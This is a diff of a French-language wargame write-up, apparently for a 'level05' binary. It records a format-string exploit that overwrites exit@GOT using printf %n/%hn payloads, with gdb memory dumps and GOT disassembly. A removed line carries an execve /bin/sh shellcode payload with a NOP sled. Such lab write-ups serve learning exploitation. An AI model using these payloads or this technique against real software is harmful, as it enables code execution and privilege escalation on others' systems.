@@ -44,6 +44,20 @@ Non-debugging symbols:
 0x08048370  exit  
 0x08048370  exit@plt  
   
+(gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + '%4294957070\$n'")
+0x0804847a in main ()
+(gdb) x/wx $esp
+0xffffd690:     0xffffd6b8
+(gdb) x/5wx 0xffffd6b8
+0xffffd6b8:     0x080497e0      0x39323425      0x37353934      0x24303730
+0xffffd6c8:     0x00000a6e
+Breakpoint 2, 0x08048507 in main ()
+(gdb) x/5wx 0xffffd6b8
+0xffffd6b8:     0x080497e0      0x39323425      0x37353934      0x24303730
+0xffffd6c8:     0x00000a6e
+
+Nous pouvons voir que les bytes que nous avons rentrer dans le fgets() ne sont pas modifier, mais que nous n'avons pas jump sur notre shellcode
+  
 Nous pouvons voir sur ce document, que les valeurs des int pris en compte par printf ont une limite :  
 https://cs155.stanford.edu/papers/formatstring-1.2.pdf  
   
@@ -60,31 +74,33 @@ Comme a sa section 4.1 (Short write), nous allons passer notre adresse en deux f
 whoami  
 level06  
   
-(python -c 'print(len("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%.55306u%10$hn" + "%.10221u%11$hn"))')  
-34  
+Je pense qu il ny a pas assez de NOPs de disponible afin de pouvoir etre sur qu une adresse arrive dans les NOPs si on met notre shellcode dans l entree standard.  
+    
   
-Je recommence mes calculs avec un environnement vierge.  
-  
-=> 0x08048475 <+49>:    call   0x8048350 <fgets@plt>  
-(gdb) x/wx $esp  
-0xffffd690:     0xffffd6b8  
-(gdb) x/s 0xffffd6b8  
-0xffffd6b8:      ""  
-  
-(gdb) p/x 0xffffd6b8+8+21  
-$2 = 0xffffd6d5  
-  
-(gdb) p/d 0xd6d5  
-$3 = 54997  
-(gdb) p/d 0xd6d5-8  
-$4 = 54989  
-  
-(gdb) p/d 0xffff  
-$5 = 65535  
-(gdb) p/d 0xffff-54997  
-$6 = 10538  
-  
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "\x90" * (100-8-23-13-13) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "%.54989u%10$hn" + "%.10538u%11$hn")'; cat) | ./level05  
-Segmentation fault (core dumped)  
-  
-Je pense qu il ny a pas assez de NOPs de disponible afin de pouvoir etre sur qu une adresse arrive dans les NOPs.  
+(gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%.55306u%10\$hn' + '%.10221u%11\$hn'")  
+=> 0x08048507 <+195>:   call   0x8048340 <printf@plt>
+(gdb) disas 0x8048370
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:     jmp    DWORD PTR ds:0x80497e0
+   0x08048376 <+6>:     push   0x18
+   0x0804837b <+11>:    jmp    0x8048330
+End of assembler dump.
+(gdb) disas 0x80497e0
+Dump of assembler code for function exit@got.plt:
+   0x080497e0 <+0>:     jbe    0x8049765 <_DYNAMIC+105>
+   0x080497e2 <+2>:     add    al,0x8
+End of assembler dump.
+
+=> 0x0804850c <+200>:   mov    DWORD PTR [esp],0x0
+(gdb) disas 0x8048370
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:     jmp    DWORD PTR ds:0x80497e0
+   0x08048376 <+6>:     push   0x18
+   0x0804837b <+11>:    jmp    0x8048330
+End of assembler dump.
+(gdb) disas 0x80497e0
+Dump of assembler code for function exit@got.plt:
+   0x080497e0 <+0>:     adc    bl,al
+   0x080497e2 <+2>:     (bad)  
+   0x080497e3 <+3>:     jmp    DWORD PTR [eax]
+End of assembler dump.
